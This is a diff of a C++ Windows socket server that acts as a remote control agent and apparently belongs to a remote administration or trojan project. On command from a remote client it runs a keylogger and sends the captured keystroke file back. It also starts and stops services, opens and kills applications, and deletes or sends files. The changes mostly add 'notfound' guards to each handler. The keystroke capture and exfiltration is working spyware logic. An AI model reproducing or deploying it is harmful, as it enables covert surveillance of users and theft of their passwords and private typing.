@@ -278,95 +278,87 @@ int main(int argc, char *argv[])
         {
             char time[bufferSize] = {};
             recv(acceptSocket, time, bufferSize, 0);
-            keylogger(stoi(time));
-            ifstream file("keylogger.txt", ios::binary | ios::ate);
-            if (!file.is_open()) {
-                content.push_back("Failed to open keylogger.txt");
-                frame.displayAnimationDefault(content);
-                content.pop_back();
-                // cout << "Failed to open keylogger.txt" << endl;
-                continue;
-            }
-
-            // Get file size and allocate buffer
-            streamsize fileSize = file.tellg();
-            file.seekg(0, ios::beg);
-            char *fileBuffer = new char[fileSize];
-            if (!file.read(fileBuffer, fileSize)) {
-                content.push_back("Failed to read keylogger.txt");
-                frame.displayAnimationDefault(content);
-                content.pop_back();
-                // cout << "Failed to read keylogger.txt" << endl;
-                delete[] fileBuffer;
-                file.close();
-                continue;
-            }
-            file.close();
-
-            // Send file size first
-            send(acceptSocket, reinterpret_cast<char*>(&fileSize), sizeof(fileSize), 0);
-
-            // Send file content in chunks
-            int sentBytes = 0;
-            while (sentBytes < fileSize) {
-                int bytesToSend = min(bufferSize, static_cast<int>(fileSize - sentBytes));
-                int result = send(acceptSocket, fileBuffer + sentBytes, bytesToSend, 0);
-                if (result == SOCKET_ERROR) {
-                    content.push_back( "Error sending file data: " + WSAGetLastError());
+            if (string(time) != "notfound") {
+                keylogger(stoi(time));
+                ifstream file("keylogger.txt", ios::binary | ios::ate);
+                if (!file.is_open()) {
+                    content.push_back("Failed to open keylogger.txt");
                     frame.displayAnimationDefault(content);
                     content.pop_back();
-                    // cout << "Error sending file data: " << WSAGetLastError() << endl;
-                    break;
+                    // cout << "Failed to open keylogger.txt" << endl;
+                    continue;
                 }
-                sentBytes += result;
+
+                // Get file size and allocate buffer
+                streamsize fileSize = file.tellg();
+                file.seekg(0, ios::beg);
+                char *fileBuffer = new char[fileSize];
+                if (!file.read(fileBuffer, fileSize)) {
+                    content.push_back("Failed to read keylogger.txt");
+                    frame.displayAnimationDefault(content);
+                    content.pop_back();
+                    // cout << "Failed to read keylogger.txt" << endl;
+                    delete[] fileBuffer;
+                    file.close();
+                    continue;
+                }
+                file.close();
+
+                // Send file size first
+                send(acceptSocket, reinterpret_cast<char*>(&fileSize), sizeof(fileSize), 0);
+
+                // Send file content in chunks
+                int sentBytes = 0;
+                while (sentBytes < fileSize) {
+                    int bytesToSend = min(bufferSize, static_cast<int>(fileSize - sentBytes));
+                    int result = send(acceptSocket, fileBuffer + sentBytes, bytesToSend, 0);
+                    if (result == SOCKET_ERROR) {
+                        content.push_back( "Error sending file data: " + WSAGetLastError());
+                        frame.displayAnimationDefault(content);
+                        content.pop_back();
+                        // cout << "Error sending file data: " << WSAGetLastError() << endl;
+                        break;
+                    }
+                    sentBytes += result;
+                }
+                delete[] fileBuffer;
             }
-            delete[] fileBuffer;
             closesocket(acceptSocket);
         }
         else if (string(messageFromClient) == "startservice")
         {
             char serviceToStart[bufferSize] = {};
             recv(acceptSocket, serviceToStart, bufferSize, 0);
-            bool check = startService((serviceToStart));
-            string anotherMessageFromServer;
-            if (check)
-                anotherMessageFromServer = string(serviceToStart) + " start sucessfully";
-            else 
-                anotherMessageFromServer = string(serviceToStart) + " start unsucessfully";
-            send(acceptSocket, anotherMessageFromServer.c_str(), 1024, 0);  
+            if (string(serviceToStart) != "notfound") {
+                bool check = startService((serviceToStart));
+                string anotherMessageFromServer;
+                if (check)
+                    anotherMessageFromServer = string(serviceToStart) + " start sucessfully";
+                else 
+                    anotherMessageFromServer = string(serviceToStart) + " start unsucessfully";
+                send(acceptSocket, anotherMessageFromServer.c_str(), 1024, 0); 
+            } 
             closesocket(acceptSocket); 
         }
         else if (string(messageFromClient) == "stopservice")
         {
             char serviceToStop[bufferSize] = {};
             recv(acceptSocket, serviceToStop, bufferSize, 0);
-            bool check = stopService((serviceToStop));
-            string anotherMessageFromServer;
-            if (check)
-                anotherMessageFromServer = string(serviceToStop) + " stop sucessfully";
-            else 
-                anotherMessageFromServer = string(serviceToStop) + " stop unsucessfully";
-            send(acceptSocket, anotherMessageFromServer.c_str(), 1024, 0);   
+            if (string(serviceToStop) != "notfound") {
+                bool check = stopService((serviceToStop));
+                string anotherMessageFromServer;
+                if (check)
+                    anotherMessageFromServer = string(serviceToStop) + " stop sucessfully";
+                else 
+                    anotherMessageFromServer = string(serviceToStop) + " stop unsucessfully";
+                send(acceptSocket, anotherMessageFromServer.c_str(), 1024, 0);   
+            }
             closesocket(acceptSocket);
         }
         else if (string(messageFromClient) == "listapp")
         {   
             vector<Application> gotApp = GetOpenApplications();
-            // map<DWORD, string> Apps;
-            // for (int i = 0; i < gotApp.size(); i++)
-            // {
-            //     Apps.insert({gotApp[i].pid, gotApp[i].title});
-            // }
-            // byteCount = send(acceptSocket, messageFromServer, bufferSize, 0);
-            // vector<string> imageName;
-            // for (auto x: gotApp){
-            //     imageName.push_back(getImageNameFromPID(x.pid));
-            // }
-            // byteCount = sendStringVector(acceptSocket, imageName);
-            // if (byteCount > 0)
-            //     cout << "Message sent: " << "Sent image name list successfully!" << endl;
-            // else
-            //     WSACleanup();
+
             byteCount = sendApplications(acceptSocket, gotApp);
             if (byteCount > 0){
                 content.push_back("Message sent: Sent apps list successfully!");
@@ -383,61 +375,65 @@ int main(int argc, char *argv[])
             // string nameApp = string(messageFromClient).substr(8);
             char nameApp[bufferSize] = {};
             recv(acceptSocket, nameApp, bufferSize, 0);
-            content.push_back("Name of app to open: " + string(nameApp));
-            frame.displayAnimationDefault(content);
-            content.pop_back();
-            // cout << "Name of app to open: " << nameApp << endl;
-            int check = openApplicationByName(nameApp);
-            string announcement = "";
-            if (check == 0)
-                announcement = "Open required app unsuccessfully!";
-            else if (check == 1)
-                announcement = "Open required app successfully!";
-            strcpy(messageFromServer, announcement.c_str());
-            byteCount = send(acceptSocket, messageFromServer, 1024, 0);
-            if (byteCount > 0){
-                content.push_back("Message sent:  " + string(messageFromServer));
+            if (string(nameApp) != "notfound") {
+                content.push_back("Name of app to open: " + string(nameApp));
                 frame.displayAnimationDefault(content);
                 content.pop_back();
-                // cout << "Message sent: " << messageFromServer << endl;
+                // cout << "Name of app to open: " << nameApp << endl;
+                int check = openApplicationByName(nameApp);
+                string announcement = "";
+                if (check == 0)
+                    announcement = "Open required app unsuccessfully!";
+                else if (check == 1)
+                    announcement = "Open required app successfully!";
+                strcpy(messageFromServer, announcement.c_str());
+                byteCount = send(acceptSocket, messageFromServer, 1024, 0);
+                if (byteCount > 0){
+                    content.push_back("Message sent:  " + string(messageFromServer));
+                    frame.displayAnimationDefault(content);
+                    content.pop_back();
+                    // cout << "Message sent: " << messageFromServer << endl;
+                }
+                else 
+                    WSACleanup();
             }
-            else 
-                WSACleanup();
             closesocket(acceptSocket);
         }
         else if (string(messageFromClient).substr(0, 8) == "closeapp")
         {
             char appName[bufferSize] = {};
             recv(acceptSocket, appName, bufferSize, 0);
-            content.push_back("Name of app to close: " + string(appName));
-            frame.displayAnimationDefault(content);
-            content.pop_back();
-            // cout << "Name of app to close: " << appName << endl;
-            DWORD pidOfApp = FindPIDByImageName(string(appName));
-            string announcement = "";
-            if (closeApplication(pidOfApp))
-            {
-                announcement = "Terminate required application successfully!";
-            }
-            else
-                announcement = "Terminate unsuccessfully!";
-            strcpy(messageFromServer, announcement.c_str());
-            byteCount = send(acceptSocket, messageFromServer, 1024, 0);
-            if (byteCount > 0){
-                content.push_back("Message sent:  " + string(messageFromServer));
+            if (string(appName) != "notfound") {
+                content.push_back("Name of app to close: " + string(appName));
                 frame.displayAnimationDefault(content);
                 content.pop_back();
-                // cout << "Message sent: " << messageFromServer << endl;
+                // cout << "Name of app to close: " << appName << endl;
+                DWORD pidOfApp = FindPIDByImageName(string(appName));
+                string announcement = "";
+                if (closeApplication(pidOfApp))
+                {
+                    announcement = "Terminate required application successfully!";
+                }
+                else
+                    announcement = "Terminate unsuccessfully!";
+                strcpy(messageFromServer, announcement.c_str());
+                byteCount = send(acceptSocket, messageFromServer, 1024, 0);
+                if (byteCount > 0){
+                    content.push_back("Message sent:  " + string(messageFromServer));
+                    frame.displayAnimationDefault(content);
+                    content.pop_back();
+                    // cout << "Message sent: " << messageFromServer << endl;
+                }
+                else 
+                    WSACleanup();
             }
-            else 
-                WSACleanup();
             closesocket(acceptSocket);
         }
         else if (string(messageFromClient).substr(0, 10) == "deletefile")
         {
             char filePath[bufferSize];
             int bytesRead = recv(acceptSocket, filePath, bufferSize, 0);
-            if (bytesRead > 0) {
+            if (string(filePath) != "notfound") {
                 filePath[bytesRead] = '\0';
                 content.push_back("Client requested file: " + string(filePath));
                 frame.displayAnimationDefault(content);
@@ -466,7 +462,7 @@ int main(int argc, char *argv[])
         {
             char filePath[BUFFER_SIZE];
             int bytesRead = recv(acceptSocket, filePath, BUFFER_SIZE, 0);
-            if (bytesRead > 0) {
+            if (string(filePath) != "notfound") {
                 filePath[bytesRead] = '\0';
                 content.push_back("Client requested file: " + string(filePath));
                 frame.displayAnimationDefault(content);
